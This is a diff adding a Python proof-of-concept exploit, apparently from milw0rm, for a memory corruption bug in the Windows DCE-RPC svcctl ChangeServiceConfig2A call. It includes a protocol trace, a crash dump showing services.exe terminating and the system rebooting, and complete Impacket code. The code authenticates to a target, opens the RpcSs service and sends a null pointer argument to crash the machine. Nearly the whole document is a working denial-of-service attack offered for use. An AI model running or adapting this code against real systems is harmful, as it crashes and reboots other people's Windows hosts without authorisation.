@@ -1,0 +1,202 @@
+#!/usr/bin/python
+# MS Windows DCE-RPC svcctl ChangeServiceConfig2A() 0day Memory Corruption PoC Exploit
+# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
+# Tested on Windows 2000 SP4 Polish (all patches)
+#
+# Requires..
+# - Impacket : http://oss.coresecurity.com/projects/impacket.html
+# - PyCrypto : http://www.amk.ca/python/code/crypto.html
+#
+# Details:..
+#
+# [exploit] Session Setup AndX Request, User: Administrator -->        [target]
+# [exploit] Session Setup AndX Response <--                            [target]
+# [exploit] Tree Connect AndX Request -->                              [target]
+# [exploit] Tree Connect AndX Response <--                             [target]
+# [exploit] NT Create AndX Request, Path: \svcctl -->                  [target]
+# [exploit] NT Create AndX Response, Fid: 0x4000 <--                   [target]
+# [exploit] DCERPC Bind UUID: SVCCTL -->                               [target]
+# [exploit] DCERPC Bind_ack <--                                        [target]
+# [exploit] SVCCTL OpenSCManagerW request -->                          [target]
+# [exploit] SVCCTL OpenSCManagerW response(handle) <--                 [target]
+# [exploit] SVCCTL OpenServiceW request -->                            [target]
+# [exploit] SVCCTL OpenServiceW response(handle) <--                   [target]
+# [exploit] SVCCTL ChangeServiceConfig2A(handle, 1, 1, 0x00000000) --> [target]
+# [exploit] DCERPC Fault: status: unknwon(0xc00000fd) <--              [target]
+# [exploit] SVCCTL ChangeServiceConfig2A(handle, 1, 1, 0x00000000) --> [target]
+# [exploit] SMB Trans Response, Error: Unknown DoS Error <--           [target](crashed)
+#
+# [Module services]
+# Exception C0000005 (ACCESS_VIOLATION reading [00000000])
+# -------------------------------------------------------------
+# EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EBX=004D83C0: 28 83 4D 00 48 84 4D 00-34 84 4D 00 48 61 08 00
+# ECX=00000890: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EDX=00000001: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# ESP=015BF8C0: 34 F9 5B 01 00 00 00 00-00 FB 5B 01 00 00 00 00
+# EBP=015BF8F4: 30 F9 5B 01 AD 20 01 01-B8 FB 0D 00 01 00 00 00
+# ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EDI=01017000: 90 9C 07 00 FF FF FF FF-00 00 00 00 00 00 00 00
+# EIP=010108A8: FF 30 68 90 A5 00 01 FF-75 FC E8 CF 1D 00 00 8B
+#               --> PUSH DWORD PTR [EAX]
+#
+# [Process services.exe terminated, system reboot]
+#
+# Just for fun ;]
+##
+
+from impacket.structure import Structure
+from impacket.dcerpc import transport
+from impacket import uuid
+from random import randint
+from time import sleep
+
+host = '192.168.0.1'
+username = 'Administrator'
+password = 'Administrator_Password'
+
+interface = ('svcctl', '367abb81-9844-35f1-ad32-98f038001003', '2.0')
+
+stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
+stringbinding %= {
+'host': host,
+'pipe': interface[0],
+}
+
+# random dword
+def dword_rand():
+   s_dword = 256 ** 4
+   return randint(0, s_dword)
+
+# unicode string
+def utf16(str):
+   return str.encode('utf_16_le')
+
+# MS RPC string
+def rpcstr(str, id = 1, unicode_string = 1):
+   class foo(Structure):
+       alignment = 4
+       structure = ()
+
+       if(id == 1):
+           structure += (('id', '<L')),
+
+       structure += (
+           ('max', '<L'),
+           ('offset', '<L=0'),
+           ('actual', '<L'),
+           ('str', '%s'),
+       )
+
+   query = foo()
+
+   if(id == 1):
+       query['id'] = dword_rand()
+
+   query['max'] = len(str)
+   query['actual'] = len(str)
+
+   if(unicode_string == 1):
+       query['str'] = utf16(str)
+   else:
+       query['str'] = str
+
+   return query
+
+# MS RPC OpenSCManager
+def OpenSCManager(host, access = 1):
+   class foo(Structure):
+       opnum = 0x0f
+       structure = (
+           ('str1', ':'),
+           ('null', '<L=0'),
+           ('access', '<L'),
+       )
+
+   query = foo()
+   query['str1'] = rpcstr("\\\\%s\x00" % (host))
+   query['access'] = access
+
+   return query
+
+# MS RPC OpenServiceW
+def OpenService(handle, service, access = 1):
+   class foo(Structure):
+       opnum = 0x10
+       structure = (
+           ('handle', ':'),
+           ('str1', ':'),
+           ('access', '<L'),
+       )
+
+   query = foo()
+
+   query['handle'] = handle
+   query['str1'] = rpcstr("%s\x00" % (service), 0)
+   query['access'] = access
+
+   return query
+
+trans = transport.DCERPCTransportFactory(stringbinding)
+trans.set_credentials(username, password)
+trans.connect()
+dce = trans.DCERPC_class(trans)
+dce.bind(uuid.uuidtup_to_bin((interface[1], interface[2])))
+
+query = OpenSCManager(host, access = 1)
+dce.call(query.opnum, query)
+raw = dce.recv()
+handle = raw[:20]
+
+query = OpenService(handle, "RpcSs", access = 0xF01FF)
+dce.call(query.opnum, query)
+raw = dce.recv()
+handle = raw[:20]
+
+##
+# ChangeServiceConfig2A() [IDL code generated by mIDA v1.0.7]
+#
+# typedef struct struct_1 {
+#  long elem_1;
+#  [switch_is(elem_1)] union union_2 elem_2;
+#  } struct_1 ;
+#
+# typedef [switch_type( unsigned long )] union union_2 {
+# [case(1)]  struct struct_3 * elem_1;
+# [case(2)]  struct struct_4 * elem_2;
+# } union_2;
+#
+# typedef struct struct_3 {
+# [string] char * elem_1;
+# } struct_3 ;
+#
+#
+# /* opcode: 0x24, address: 0x0101203B */
+#
+# long  sub_101203B (
+# [in][context_handle] void * arg_1,
+# [in] struct struct_1 arg_2
+# );
+##
+
+class ChangeServiceConfig2A(Structure):
+   opnum = 0x24
+   structure = (
+       ('context_handle', ':'),
+       ('switch_is', '<L=1'),
+       ('case', '<L=1'),
+       ('struct_3', '<L=0x00000000'), # <-- vulnerable argument
+     )
+
+query = ChangeServiceConfig2A()
+query['context_handle'] = handle
+
+for i in range(0, 2):
+   dce.call(query.opnum, query)
+   sleep(1)
+
+dce.disconnect()
+
+# EoF
+
+# milw0rm.com [2007-03-10]
